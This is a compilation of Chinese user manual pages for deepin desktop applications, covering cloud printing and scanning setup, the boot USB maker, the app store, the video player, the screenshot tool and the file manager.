标题：深度云打印
深度云打印是由武汉深之度科技有限公司开发的一种新型打印解决方案，它可以将您的打印机连接到网络，借助深度云打印，您可以通过日常使用的应用程序进行网络打印。同时深度云打印适用于台式机、笔记本电脑、部分平板电脑以及其他所有您已授权打印的联网设备。深度云打印由服务器端（Windows操作系统）和客户端（深度操作系统）组成，服务器端和客户端需要分别进行配置。

您可以在Windows操作系统中安装深度云打印的服务器应用程序以及配置授权码。获取服务器安装程序：深度云打印的服务器安装程序集成在深度操作系统的镜像文件中，您只需要使用压缩软件解压即可进行安装。在深度操作系统的镜像文件中，深度云打印的服务器安装程序命名格式为DeepinCloudPrintServerInstaller_*.exe。您也可以从百度网盘直接下载（链接：https://pan.baidu.com/s/1bofTyoR#list/path=%2F）。在Windows操作系统中进行安装，根据安装向导的提示，完成程序安装。

当您安装完成后，系统默认获取Windows操作系统中的IP地址，您只需要设置授权码即可。如果您需要更改授权码，直接在授权码文本框中输入新的授权码，点击更新后即可生效。设置步骤：1. 在Windows操作系统中，点击开始菜单，打开云打印机程序。2. 自动获取系统中IP地址。3. 在云打印机设置界面，输入授权码。4. 点击更新，在界面上显示状态。5. 当授权码更新成功后，在界面上显示√状态。

您可以在深度操作系统中打开深度云打印客户端应用程序，添加一个或多个云打印机。打开步骤：1. 点击任务栏上的进入启动器界面。2. 通过浏览找到进行点击，进入深度云打印界面。

设置深度云打印步骤：1. 在深度云打印界面，输入打印机在Windows操作系统中的IP地址和授权码。2. 点击下一步，显示所有Windows操作系统中的打印机列表。3. 在对应的打印机列表后点击＋，该打印机名称后显示为“已添加”状态。4. 点击，进入打印设置界面。5. 查看已添加的打印机是否添加成功。如果您需要删除打印机，进入"打印设置"界面中选择打印机，点击鼠标右键 > 删除。

您可以在客户端（深度操作系统）打开文件，选择云打印机进行打印，以下测试以.doc文件为例。如果Windows操作系统更新了深度云打印的授权码，当您在打印文件时，系统自动弹出“云打印服务器授权码已被更新，请输入新的授权码”对话框，请联系管理员获取新的授权码后输入继续打印。打印过程中如果出现错误，请根据错误提示，重新进行设置。测试步骤：1. 使用WPS文字打开.doc文件。2. 点击左上角的WPS文字。3. 选择打印，进入打印设置界面。4. 在名称下拉选项中，选择打印机并设置其他打印参数。5. 点击确定。

深度云打印是由武汉深之度科技有限公司开发的一种新型打印解决方案，它可以将您的打印机连接到网络，借助深度云打印，您可以通过日常使用的应用程序进行网络打印。同时深度云打印适用于台式机、笔记本电脑、部分平板电脑以及其他所有您已授权打印的联网设备。

深度云打印由服务器端（Windows操作系统）和客户端（深度操作系统）组成，服务器端和客户端需要分别进行配置。服务器端配置包括安装深度云打印和设置云打印授权码。安装时需获取服务器安装程序，该程序集成在深度操作系统的镜像文件中，命名格式为DeepinCloudPrintServerInstaller_*.exe，也可从百度网盘下载。

设置云打印授权码时，系统默认获取Windows操作系统的IP地址。在授权码文本框中输入新授权码并点击更新即可生效。更新成功后界面显示√状态。

客户端配置需打开深度云打印应用程序：点击任务栏启动器图标，浏览并点击打印机图标进入界面。输入Windows操作系统的IP地址和授权码后，点击下一步添加打印机，在打印机列表后点击＋使状态变为“已添加”。

打印测试以.doc文件为例。若Windows更新授权码，打印时会弹出“云打印服务器授权码已被更新，请输入新的授权码”对话框，需联系管理员获取新码。打印错误需根据提示重新设置。使用WPS文字打印时，点击左上角WPS文字＞打印＞在名称下拉选项中选择云打印机＞点击确定。

标题：深度云扫描
深度云扫描是由武汉深之度科技有限公司开发的一种新型扫描技术，它可以将您的扫描仪连接到网络，借助深度云扫描，您可以通过日常使用的应用程序进行网络扫描。同时深度云扫描适用于台式机、笔记本电脑、部分平板电脑以及其他所有您已授权扫描的联网设备。深度云扫描由服务器端（Windows操作系统）和客户端（深度操作系统）组成，服务器端和客户端需要分别进行配置。

您可以在服务器端安装深度云扫描的服务器应用程序以及配置授权码。通过官方提供地址下载深度云扫描的服务器端应用程序。安装步骤：1. 获取深度云扫描服务器端应用程序。2. 在Windows操作系统中进行安装。3. 根据安装向导的提示，完成程序安装。

当您安装完成后，系统默认获取服务器端的IP地址，您只需要设置授权码即可。步骤：1. 在服务器端打开云扫描应用程序。2. 自动获取系统中IP地址。3. 在云扫描机设置界面，输入授权码。4. 点击 更新，在界面上显示 spinner 状态 。如果需要更改授权码，直接在 授权码 文本框中输入新的授权码，点击 更新 后即可生效。

您可以在深度操作系统中打开深度云扫描客户端应用程序，可以添加一个或多个扫描仪。打开步骤：1. 点击任务栏上的 launcher-24 进入启动器界面。2. 通过浏览找到 scanner-24 进行点击，进入深度云扫描界面。

设置深度云扫描步骤：1. 在深度云扫描界面，点击 ＋. 2. 进入添加扫描仪界面，输入服务器端中的IP地址和授权码。3. 点击 下一步 ，显示所有服务器端中的扫描仪列表。4. 在对应的扫描仪列表后点击 ＋，该扫描仪名称后显示为“已添加”状态。5. 点击 扫描，进入扫描易界面进行设置。如果输入服务器端IP地址和授权码后，提示“无效的IP地址”，进入服务器端关闭Windows防火墙。

如果已经添加过扫描仪，可以进入深度云扫描列表界面，点击窗口左上角 ＋ 添加多个扫描仪设备。如果需要删除深度云扫描列表中的扫描仪，点击窗口左上角 － 可以删除扫描仪设备。

关于：您可以点击关于查看深度云扫描的版本介绍。步骤：1. 在深度云扫描界面，点击 icon_menu。2. 点击 关于。3. 查看关于深度云扫描的版本和介绍。

帮助：您可以点击帮助获取深度云扫描的帮助手册，通过帮助进一步让您使用和配置深度云扫描。步骤：1. 在深度云扫描界面，点击 icon_menu。2. 点击 帮助。3. 查看关于深度云扫描的帮助手册。

退出：您可以进入菜单栏点击退出深度云扫描。步骤：1. 在深度云扫描界面，点击 icon_menu。2. 点击 退出。也可以在深度云扫描界面中点击 × 按钮来退出。

云扫描测试：您可以在客户端（深度操作系统）打开图片或PDF文件，打开启动器界面中扫描易进行扫描。步骤：1. 进入启动器界面，浏览找到 scanner-24 点击，进入扫描易界面。2. 点击左上角的图标。3. 选择 首选项，进入扫描易设置界面。4. 在 扫描来源 下拉选项中，选择扫描仪并设置其他扫描参数。5. 点击 确定。6. 在扫描易界面上，点击 扫描 即可。如果Windows操作系统更新了深度云扫描的授权码，扫描时会提示授权码已更新，请联系管理员获取新的授权码后输入继续扫描。扫描过程中如果出现错误，请根据错误提示重新设置。

标题：深度启动盘制作工具
深度启动盘制作工具，是基于deepin使用的工具。用户按照提示将ISO刻录到U盘即可。

首先，下载最新深度iso映像，然后如果使用的是Windows,双击这个exe文件，进入深度启动盘制作工具，如果用的是deepin，直接在启动器里运行即可。

打开工具后，插入U盘。然后将iso镜像拖拽到这个窗口，确认无误后单击下一步。选择一个U盘，勾选“格式化U盘以提高成功率”，（注意：请务必先将U盘里重要数据进行备份，否则会永久销毁U盘里的数据）单击下一步。

单击下一步后，你的U盘将被格式化，期间不能弹出U盘或关机。完成后,U盘的卷标会重命名为DEEPINOS，文件类型会变成FAT32。

启动盘制作完成后，将其插入欲要安装deepin的主机，开机时不停按下F12键（不一定都是F12键进入启动菜单，具体请看开机第一屏）如果能看到deepin启动画面并进入深度安装器，说明启动盘制作成功！

如果文字比较枯燥，你可以点击以下链接：<https://www.bilibili.com/video/BV1Qx41187wL>

标题：深度商店
深度商店V4.0是武汉深之度科技有限公司重新打造的一款集应用展示、下载、安装、评论、评分于一体的应用程序。深度商店为您精心筛选和收录了不同类别的应用，同时每款应用都经过人工安装并验证，您可以进入商店搜索热门应用，一键下载并自动安装。

运行深度商店的方法：1. 点击任务栏上的启动器图标进入启动器界面，通过浏览找到商店图标点击。2. 深度商店已默认固定在任务栏，可直接点击任务栏图标运行。关闭方法：1. 点击界面×图标退出。2. 右键任务栏图标选'关闭所有'。3. 通过菜单栏选择退出。

主界面组成：1. 导航栏：显示首页/排行榜/应用分类。2. 搜索框：全局搜索应用。3. 首页轮播：推荐应用图片展示。4. 首页栏目：热门推荐/本周热门/本月热门/装机必备。5. 专题应用：热门专题合集。6. 任务管理：显示下载进度/速度/安装进度，支持暂停删除。7. 菜单栏：登录/帮助/关于/退出功能。

应用搜索：支持中英文关键字搜索，输入时自动匹配补全，按Enter执行全局搜索。点击搜索框×可清空记录。应用管理：点击应用图片进入详情页，点击安装按钮自动下载安装。悬停应用图片也可直接安装。

应用详情页包含：应用状态(安装/打开/更新)、评分/下载量、版本号、下载大小、应用介绍、预览图、赞赏功能(支持支付宝/微信打赏)。

评论评分规则：必须登录后操作，评论和评分需同时提交。每个应用版本只能评论一次。未登录用户仅可查看评论。登录后在评论框输入内容，通过星级图标评分，可查看当前版本和历史版本评价。

选项设置：登录-使用深度论坛账号登录，支持记住密码。帮助-查看商店使用手册。关于-查看版本信息。退出-关闭应用程序。

更新/升级应用：如果您需要更新和升级应用，可以通过控制中心来设置更新和升级应用，具体操作请参阅 [更新和升级]。

卸载应用：如果您需要卸载应用，可以通过进入启动器界面来卸载应用，也可以在卸载应用中卸载要卸载的应用，具体操作请参阅 [卸载应用程序]。

标题：深度壁纸
壁纸，又名电脑壁纸或桌面背景，是在桌面上可以随意个性化的图片。随着电脑技术的发展，从黑白屏到彩屏，电脑的待机桌面不再由单一的颜色所组成，而是可以用一张图片来替换，这张壁纸便称之为电脑壁纸。电脑壁纸是电脑屏幕所使用的背景图片，可以根据大小和分辨率来做相应调整。电脑壁纸让我们的电脑看起来更好看，更漂亮和更有个性。

设置方法请参考[深度桌面环境帮助手册-设置壁纸](https://wiki.deepin.org/zh/01_deepin%E9%85%8D%E5%A5%97%E7%94%9F%E6%80%81/01_deepin%E5%85%A5%E9%97%A8/%E6%B7%B1%E5%BA%A6%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83)

系统默认壁纸目录：/usr/share/backgrounds
深度桌面环境壁纸目录：/usr/share/personalization/themes/Deepin/wallpapers

标题：深度影院
深度影院提供直观易用的操作界面和丰富齐全的快捷键，依靠键盘可完成所有播放操作，摆脱鼠标束缚；能播放多种格式视频文件，利用流媒体功能欣赏网络视频资源。

运行深度影院可通过点击桌面底部启动器图标或移鼠标至屏幕左上角进入启动器，浏览找到影院图标点击；也可点击任务栏上默认固定的影院图标。

关闭深度影院可点击界面×，或右键单击任务栏影院图标选择关闭所有。

移动播放窗口需将鼠标指针置于界面上，按住左键拖拽至任意位置。

自定义窗口大小可手动拖拽等比例缩放，将鼠标放界面边缘呈双向箭头，按住左键拖拽即可。

查看快捷键可按Ctrl+Shift+?打开预览界面查看所有快捷键。

启用快捷键需点击界面按钮，依次进入设置、快捷键，勾选启用复选框。

修改快捷键需点击界面按钮，进入设置、快捷键，点击要修改的快捷键输入新的。

删除快捷键需点击界面按钮，进入设置、快捷键，点击要删除的快捷键按退格键。

获取视频文件可通过USB从存储设备拷贝，或联网复制网络视频网址在线播放。

打开视频文件可通过右键或界面按钮选打开文件，点击打开文件图标或按Ctrl+O，拖拽文件，双击界面等方式。

打开文件夹可右键或界面按钮选打开文件夹，或拖拽文件夹到影院。

打开URL需复制网络视频网址，在影院右键或界面按钮选打开URL，粘贴网址确定。

在线播放视频需确保电脑连入网络。

设置全屏可双击左键，右键或界面按钮选全屏，点击全屏图标，按Enter键。

退出全屏可双击左键，右键或界面按钮选退出全屏，点击取消全屏按钮，按Esc键。

设置迷你模式可右键或界面按钮选迷你模式，或按F2键。

退出迷你模式可右键或界面按钮选退出迷你模式，或按F2键。

设置置顶显示需右键或界面按钮点击置顶。

取消置顶显示需右键或界面按钮选择置顶。

播放窗口显示视频内容，鼠标移入显示信息和图标，移出或无操作隐藏，可拖拽和调节大小。

进度条显示播放进度，拖拽可改变进度，鼠标置于其上显示预览窗口。

播放视频可点击播放图标，按空格键，点击鼠标左键。

暂停播放可点击暂停图标，按空格键，点击鼠标左键。

播放上一个视频可按↑键，右键或界面按钮选播放>上一个，点击上一个图标。

播放下一个视频可按Page Down键，右键或界面按钮选播放>下一个，点击下一个图标。

快进视频可按→键，或右键/界面按钮选播放>快进。

快退视频可按←键，或右键/界面按钮选播放>快退。

加速播放视频可按Ctrl+→键。

减速播放视频可按Ctrl+←键。

恢复原速播放视频可按R键。

查看当前播放视频文件信息可右键/界面按钮点击信息，或通过播放列表右键选择信息。

设置静音可右键/界面按钮选声音>静音，按M键，点击音量图标。

取消静音可再次按M键，或点击静音图标。

调节画面尺寸可右键/界面按钮点击画面，选择对应倍数。

调节画面比例可右键/界面按钮点击画面，选择对应比例。

旋转画面可右键/界面按钮点击画面，选择对应旋转方式。

手动载入字幕可右键/界面按钮选字幕>手动载入，选择对应格式字幕文件；也可拖拽字幕文件到播放区域。

选择字幕可右键/界面按钮点击字幕，选择字幕选择及对应文件。

隐藏字幕可右键/界面按钮点击字幕，选择隐藏字幕。

设置字幕方式可右键/界面按钮点击设置，选择字幕设置。

设置字幕大小和颜色可右键/界面按钮点击字幕，选择字幕设置，进行对应调整。

设置字幕延时可右键/界面按钮点击字幕，选择字幕设置，调整同步时间。

调整字幕显示位置可右键/界面按钮点击字幕，选择字幕设置，拖拽位置滑条；或按Shift+↑/↓键。

展开播放列表可右键/界面按钮选播放列表，按F3键，点击对应图标等。

添加文件/文件夹到播放列表可在播放列表界面右键/点击+，选择添加；或拖拽文件/文件夹。

在播放列表中播放视频可双击文件或右键选择播放。

查看播放列表中视频存放路径可右键文件，选择打开文件所在位置。

在播放列表中删除视频可点击×或右键选择从播放列表删除。

设置播放列表播放顺序可在播放列表界面右键/点击播放顺序图标，选择对应播放方式。

导出播放列表可在播放列表界面右键点击导出，选择存放路径完成导出。

导入播放列表可在播放列表界面点击导入，选择要导入的列表并查看提示信息。

清空播放列表可在播放列表界面右键点击或点击清空列表图标，选择清空播放列表。

基础设置中的播放选项包含多种功能勾选，如打开文件时全屏、应用上次关闭尺寸等。

设置快进快退时间跨度需进入基础设置的时间跨度选项，通过加减或重置调整。

字幕设置的具体操作可参考设置字幕相关内容。

查看版本和介绍信息可通过设置中的关于选项查看。

标题：深度截图
深度截图是武汉深之度科技有限公司开发的深度操作系统下自带的截图工具。在日常工作和娱乐中，为了展示特定状态下的程序界面，应用场景等，需要截取可以显示在屏幕或其他显示设备上的可视图像，您可以通过运行深度截图软件来实现。深度截图拥有模糊和马赛克的图片编辑功能，在传播图片的过程中帮助您保护隐私信息不外泄，支持丰富的网络社交平台，让您随时随地的与朋友互动，分享身边的精彩！

您可以通过执行以下操作之一来运行深度截图，进入截图模式后，整个电脑屏幕将会变暗。在任务栏上，点击 ![启动器](/images/1/18/Launcher_icon.png) 进入启动器界面，通过浏览找到 ![深度截图](/images/5/53/Screenshot-24.png) 点击。按下键盘上的 **Ctrl**+**Alt**+**A** 组合键来快速运行深度截图。

延时截图给您预留了5s的准备时间，帮您截取最精准的瞬间。如果您已经将深度截图固定到任务栏，右键单击任务栏上的 ![深度截图](/images/5/53/Screenshot-24.png)，然后选择 **延时截图** 来延时截取。您也可以通过操作以下步骤来实现延时截图：1. 按下键盘上的 **Ctrl**+**Print** 组合键。2. 在屏幕的右上角，您会看到“深度截图将在5秒后启动”的提示信息。3. 等待5s后自动进入截图模式，整个屏幕变暗。

在截图模式下，您可以通过以下两种方式来退出截图：按下键盘上的 **Esc** 键。点击鼠标右键，选择 **退出**。

目前比较常用的有三种截图区域：全屏、程序窗口和自选区域。在截图时选中对应的区域，在区域四周会出现一个蓝色边框，并且该区域会亮度显示。当电脑多屏显示时，您也可以使用深度截图来截取不同屏幕上的区域。选择全屏是识别当前显示器的整个屏幕。您可以通过操作以下步骤来选择全屏：1. 按下键盘上的 **Ctrl**+**Alt**+**A** 组合键，进入截图模式。2. 将鼠标指针移至桌面上，深度截图会自动选中整个屏幕，并在其左上角显示当前截图区域的尺寸大小。3. 点击桌面，在桌面的右上角会弹出工具栏。4. 如果要退出截图，请点击工具栏上的 × 或点击鼠标右键选择 **退出**。您也可以直接操作以下步骤来进行全屏截图：如果您已经将深度截图固定到任务栏，右键单击任务栏上的 ![深度截图](/images/5/53/Screenshot-24.png)，然后选择 **截取全屏** 。按下键盘上的 **Print** 键，实现全屏截图。

选择程序窗口是自动识别当前的应用窗口。1. 按下键盘上的 **Ctrl**+**Alt**+**A** 组合键，进入截图模式。2. 将鼠标指针移至打开的应用窗口上，深度截图会自动选中该窗口，并在其左上角显示当前截图区域的尺寸大小。3. 点击窗口，在窗口的右下角会弹出工具栏。4. 如果要退出截图，请点击工具栏上的 × 或点击鼠标右键选择 **退出**。

选择自选区域是通过拖动鼠标，自由选择截取的范围。1. 按下键盘上的 **Ctrl**+**Alt**+**A** 组合键，进入截图模式。2. 按住鼠标左键不放，拖动鼠标选择截图区域，在其左上角将实时显示当前截图区域的尺寸大小。3. 释放鼠标左键，完成截图，在截图区域的右下角会弹出工具栏。4. 如果要退出截图，请点击工具栏上的 × 或点击鼠标右键选择 **退出**。

您可以对截图区域进行微调，例如放大或缩小截取范围，移动截图等。放大/ 缩小截图区域：将鼠标指针置于截图区域的蓝色边框上，鼠标指针变为双向箭头。您可以：按住鼠标左键不放，拖动鼠标来放大或缩小截图区域。按下键盘上的 **Ctrl** + ↑ 或 ↓ 来上下扩展截图区域，按下键盘上的 **Ctrl** + ← 或 → 来左右扩展截图区域。移动截图位置：将鼠标指针置于截图区域上，鼠标指针变为手指。您可以：按住鼠标左键不放，拖动鼠标来移动截图区域的位置。按下键盘上的 ↑ 或 ↓ 来上下移动截图区域，按下键盘上的 ← 或 → 来左右移动截图区域。

深度截图自带的图片编辑功能，包括图形标记、文字批注等，完全可以满足您的日常图片处理需求。您还可以给图片打上马赛克，保护您的隐私。您可以通过执行以下操作之一来编辑截图：点击工具栏上的工具图标来编辑。通过快捷键来快速切换各个编辑工具。当选中截图区域后，点击鼠标右键来选择编辑工具。

在截图过程中，您可以点击工具栏上的各个图标以完成各项操作。运行深度截图，通过鼠标选中截图区域后，工具栏会自动出现在截图的下方。如果您已经对工具栏展开面板，如线条粗细、字体大小等进行了设置，深度截图会记住您的选择。当您下次启动深度截图后，将默认使用该设置，您也可以重新进行选择。

您可以在截取的图片中绘制一些简单的图形，如矩形、椭圆等。矩形工具：1. 在截图区域下方的工具栏中，点击矩形工具。2. 在工具栏展开面板中，选择矩形边线的粗细。3. 将鼠标指针置于截图区域上，鼠标指针变为矩形指针。4. 按住鼠标左键不放，拖动鼠标以完成图形区域的绘制。5. 如果截图中包含了个人隐私信息，请点击工具栏展开面板中的模糊或马赛克来涂抹。

椭圆工具：1. 在截图区域下方的工具栏中，点击椭圆。2. 在工具栏展开面板中，选择椭圆边线的粗细。3. 将鼠标指针置于截图区域上，鼠标指针变为椭圆指针。4. 按住鼠标左键不放，拖动鼠标以完成图形区域的绘制。5. 如果截图中包含了个人隐私信息，请点击工具栏展开面板中的模糊或来涂抹。

箭头工具：1. 在截图区域下方的工具栏中，点击箭头。2. 在工具栏展开面板中，选择箭头的粗细。3. 将鼠标指针置于截图区域上，鼠标指针变为箭头指针。4. 按住鼠标左键不放，拖动鼠标以完成图形区域的绘制。

画笔工具：1. 在截图区域下方的工具栏中，点击画笔。2. 在工具栏展开面板中，选择画笔的粗细。3. 点击画笔选择，在自由画笔和直线画笔之间切换。4. 将鼠标指针置于截图区域上，鼠标指针变为画笔指针。5. 按住鼠标左键不放，拖动鼠标以完成图形区域的绘制。如果需要绘制正方形、圆形等图形，您可以：按住键盘上的 **Shift** 键，然后选择矩形，绘制正方形。按住键盘上的 **Shift** 键，然后选择椭圆，绘制圆形。按住键盘上的 **Shift** 键，然后选择箭头，绘制水平或垂直方向的箭头。按住键盘上的 **Shift** 键，然后选择画笔，绘制水平或垂直方向的直线。

如果您在截图中绘制了其他的图形，您可以对绘制的图形进行修改和移动。移动图形：1. 将鼠标指针置于图形的边线上，此时鼠标指针变为手指。2. 按住鼠标左键不放，可以将图形移动到截图区域的任何位置。3. 按下键盘上的 ↑ 或 ↓ 来上下移动图形，按下键盘上的 ← 或 → 来左右移动图形。编辑图形：1. 将鼠标指针置于图形的边线上。2. 点击鼠标左键，进入图形的编辑模式，您可以：按下键盘上的 **Delete** 键，删除图形。按下键盘上的 **Ctrl**+**Z** 键，返回至上一步操作。将鼠标指针置于编辑框上，此时鼠标指针变成双向箭头，通过拖动鼠标指针，来放大或缩小图形区域。按下键盘上的 **Ctrl** +↑ 或 ↓ 来上下扩展图形区域，按下键盘上的 **Ctrl** +← 或 → 来左右扩展图形区域。将鼠标指针置于编辑框的旋转上，此时鼠标指针变成旋转，通过拖动鼠标指针，来旋转图形。3. 在编辑框外点击鼠标左键，退出编辑模式。

对截取的图片进行文字补充和说明，帮助他人更清楚的了解截取的图片。1. 在截图区域下方的工具栏中，点击文字。2. 在工具栏展开面板中，输入字号大小或通过点击+ 或 － 来增大或减小批注的字体大小。3. 将鼠标指针置于截取的图片上，此时鼠标指针变为文字指针。4. 点击要添加批注的地方，将出现一个待输入的文本框。5. 在文本框中输入文字。

如果您已经添加了文字批注，您可以对文字批注进行修改和移动。移动文字批注：1. 将鼠标指针置于文字上，此时鼠标指针变为手指。2. 按住鼠标左键不放，可以将文字移动到截图区域的任何位置。3. 按下键盘上的 ↑ 或 ↓ 来上下移动文本框，按下键盘上的 ← 或 → 来左右移动文本框。编辑文字批注：1. 将鼠标指针置于文字上。2. 点击鼠标左键，进入文字编辑模式，您可以：按下键盘上的 **Delete** 键，删除文字批注。按下键盘上的 **Ctrl**+**Z** 键，返回至上一步操作。在文本框内，修改文字信息。按下键盘上的 **Ctrl**+ ↑ 或 ↓ 来上下扩展文本框，按下键盘上的 **Ctrl**+ ← 或 → 来左右扩展文本框。将鼠标指针置于文本框的旋转上，此时鼠标指针变成旋转，通过拖动鼠标指针，来旋转文字批注。3. 在文本框外点击鼠标左键，退出编辑模式。

深度截图总共提供了16种颜色供您选择，您可以选择不同的颜色来进行不同的图形标记。1. 在截图区域下方的工具栏中，点击颜色。2. 在工具栏展开面板中，选择一种颜色。

将截取的图片保存下来，为后续的使用储存素材！当截图保存成功之后，您可以在桌面右上角看到提示信息，点击 **查看**，可打开截图所在的文件夹。您可以通过执行以下操作之一来保存截取的图片：按下键盘上的 **Ctrl**+**S** 组合键来保存。按下键盘上的 **Enter** 键来直接保存。在截取的图片中，点击鼠标右键，选择 **保存** 或双击鼠标完成保存操作。在以上操作中，截取的图片默认存放到系统的图片文件夹下。您还可以在截图区域下方的工具栏中，点击保存的下拉选项：选择 自动保存，将图片保存到系统默认的图片文件夹下。选择 保存到桌面，将图片保存到桌面。选择 保存，将图片保存到您指定的存储路径下。选择 复制到剪切板，将图片复制到剪切板。选择 自动复制并剪切，将图片保存到系统默认的图片文件夹下，并复制到剪切板。通过左右拖动滑条来调节保存图片的质量。

您可以将有趣的图片截取下来，配上文字，将这份快乐传递给您的好友，让更多人感受到！您可以按下键盘上的 **Ctrl**+**Enter** 组合键，快速实现分享！您也可以执行以下操作来分享：1. 在截图区域下方的工具栏中，点击分享。2. 在分享界面中，输入您想说的文字，点击 **下一步**。3. 选择一个社交账号，点击 **分享**。4. 登录您的社交账号授权并分享。5. 当分享成功之后，您可以在桌面右上角看到提示信息。6. 如果分享失败，请点击 **重试** 再次分享。7. 如果要退出分享，请点击 **关闭**。在分享界面中，点击左下角的分享，选择 **账户管理**，您可以对多个账号进行管理：注销登录账号。使用一个新的账号来登录分享。

标题：深度文件管理器
深度文件管理器是深度科技开发的一款功能强大、简单易用的文件管理工具。它沿用了经典文件管理器的功能和布局，并在此基础上简化了用户操作，增加了很多特色功能。一目了然的导航栏、智能识别的搜索框、多样化的视图及排序让您管理起来得心应手，经典和超越，只为给您更好的体验！

您可以通过以下方式运行或关闭深度文件管理器，或者创建深度文件管理器的快捷方式。运行深度文件管理器：1. 点击桌面底部的或将鼠标指针移到屏幕左上角，进入启动器界面。2. 上下滚动鼠标滚轮，通过浏览找到文件管理器进行点击。3. 将鼠标指针置于深度文件管理器应用程序的图标上，右键单击 图标，您可以： - 点击 发送到桌面，在桌面创建快捷方式。 - 点击 发送到任务栏，将应用程序固定到任务栏。 - 点击 开机自动启动，将应用程序添加到开机启动项，在电脑开机时自动运行该应用程序。关闭深度文件管理器： - 在深度文件管理器界面点击 × ，退出深度文件管理器。 - 在任务栏右键单击 ，选择 关闭所有 来退出深度文件管理器。 - 在深度文件管理器界面点击 ，选择 退出 来退出深度文件管理器。

深度文件管理器的主界面简单易用、功能全面，熟练的使用界面功能将使文件管理更加简单高效。导航栏：通过点击导航图标可以快速访问本地文件、磁盘、网络邻居、书签等。地址栏：通过地址栏可以快速切换访问历史、在上下级目录间切换、搜索、输入地址访问。视图栏：通过点击图标来切换文件管理器主界面视图。菜单栏：通过主菜单您可以新建窗口、查看帮助文档、关于深度文件管理器、退出深度文件管理器。状态栏：显示文件数目或者已选中文件数目。

深度文件管理器具备基本的文件管理功能，对文件(夹)进行新建、复制、重命名、删除、预览等操作都非常简单。新建文件：1. 在深度文件管理器界面上，点击鼠标右键。2. 点击 新建文档。3. 选择新建文件的类型。4. 输入新建文件的名称。新建文件夹：1. 在深度文件管理器界面上，点击鼠标右键。2. 点击 新建文件夹。3. 输入新建文件夹的名称。重命名文件(夹)：1. 在深度文件管理器界面上，右键单击文件。2. 选择 重命名。3. 输入文件(夹)名称，按 Enter 键或者鼠标点击界面空白区域。复制文件(夹)：1. 在深度文件管理器界面上，右键单击文件(夹)。2. 点击 复制。3. 选择一个目标存储位置。4. 点击鼠标右键，然后选择 粘贴。压缩文件(夹)：1. 在深度文件管理器界面上，右键单击文件。2. 点击 压缩。3. 输入压缩包名称，选择压缩包类型和目标存储位置。4. 点击 创建。删除文件(夹)：1. 在文件管理器界面上,右键单击文件(夹)。2. 选择 移动到回收站 。 - 被删除的文件(夹)可以在回收站中找到，右键单击文件(夹)可以进行 还原 或 彻底删除 操作。 - 被删除的文件(夹)的快捷方式将会失效。预览文件(夹)：1. 选中要预览的文件(夹)。2. 按空格键。打开方式：1. 在文件管理器界面上，右键单击文件。2. 选择 打开方式。3. 在程序列表中选择应用程序。显示方式：通过点击界面上的图标来切换图标视图、列表视图。 - 图标视图（`Ctrl` + `1`）：平铺显示文件的图标、名称、缩略图。 - 列表视图（`Ctrl` + `2`）：列表显示文件图标、名称、修改时间、大小、类型等信息。排序方式：1. 在文件管理器界面上,单击鼠标右键。2. 选择 排序方式。3. 在子菜单中选择一种排序方式。4. 在`列表模式`下，也可以通过点击页面表头项切换排序方式。文件(夹)属性：1. 在文件管理器界面上,右键单击文件(夹)。2. 选择 属性，查看文件(夹)属性。3. 也可使用快捷键 `Ctrl` + `i` 查看选中文件(夹)属性。

深度文件管理器具备很多特色功能，这些功能都是为了让文件管理更加简单、高效。切换地址栏：地址栏由历史导航、面包屑、输入框共同组成，通常情况下地址栏会显示面包屑，当用户点击输入框区域或者搜索图标时，地址栏会切换为输入框状态，失去焦点地址栏会恢复到面包屑状态。 - 通过点击历史导航图标，您可以快速在历史浏览记录间切换，查看前一个地址或者后一个地址。 - 文件所在位置的每一个层级都会形成一个面包屑（若某一路径是已知设备的挂载点，则该路径会被归一为单个磁盘图标），通过来回点击面包屑可以快速在不同文件层级间切换。 - 输入框带有智能识别功能，可以直接输入搜索关键词或者访问地址，系统会自动识别和判断。 - 键盘快捷键 `Ctrl` + `L` 可快速将地址栏切换为编辑模式，并且默认选中所有地址，然后使用 `Ctrl` + `C` 可快捷复制地址（比鼠标右键操作更快捷哦）搜索文件：在文件管理器输入框中输入关键词搜索相关文件。 - 需要指定目录搜索时，请先进入该目录，然后再进行搜索。 - 需要全盘搜索时，请在输入框中输入/并按下键盘上的回车键，然后再进行搜索。管理标签：文件管理器的窗口支持多标签显示。1. 在文件管理器界面上，右键单击文件夹。2. 选择 在新标签中打开。3. 当窗口有多个标签时，可以： - 点击标签栏右侧的 + 继续添加标签。 - 点击标签上的 × 关闭标签。管理书签： - 添加书签：右键单击文件管理器中的文件夹，选择添加书签就可以在导航栏创建书签。 - 移动书签：在导航栏可以用鼠标左键按住书签进行拖动，通过拖动可以调整书签排序。 - 删除书签：右键单击书签，选择 删除书签来删除书签。我的共享：当您设置了共享文件时，我的共享图标将会出现在导航栏上，当所有共享文件都取消共享后，我的共享图标自动从侧边栏中移除。共享本地文件：1. 在文件管理器界面上，右键单击文件夹。2. 选择 共享文件夹。3. 勾选 共享此文件夹。4. 根据需要设置 共享名、权限 、匿名访问 后关闭标签。5. 在文件管理器界面上，点击 。6. 选择 设置共享密码。7. 输入共享密码。8. 点击 确定。访问共享文件：局域网中其他用户共享的文件一般都可以在网络邻居中找到，您也可以通过网络邻居访问共享文件。1. 输入局域网用户的共享地址，按下键盘上的 Enter 键。（如：smb://xxx.xxx.x.xxx/share）2. 输入用户名密码或者匿名访问。 - 未加密的网络文件可以匿名访问，不需要输入用户名和密码。 - 加密的网络文件会弹出登陆框，输入账号和密码之后才能访问。如果在用户名密码提示框中勾选 记住密码 ，再次访问不再需要密码。3. 点击 连接。网络邻居：1. 点击深度文件管理器导航栏上的 图标。2. 双击想要访问的网络文件。3. 输入用户名密码或者匿名访问。 - 未加密的网络文件可以匿名访问，不需要输入用户名和密码。 - 加密的网络文件会弹出登陆框，输入账号和密码之后才能访问。如果在用户名密码提示框中勾选 记住密码 ，再次访问不再需要密码。3. 点击 连接。从终端中打开：1. 在文件管理器界面空白处单击鼠标右键。2. 选择 从终端中打开，会启动深度终端并前置，终端的路径为当前目录。3. 在文件夹上右键菜单选择 从终端中打开 将会以所选文件夹路径启动终端，若所选文件夹无访问权限，则会打开所选文件夹所在的路径。创建链接：1. 在文件管理器界面上，右键单击文件(夹)。2. 选择 创建链接。3. 在弹窗中选择创建位置、链接名称。4. 点击 保存，在目标位置会生成该文件(夹)的快捷方式。

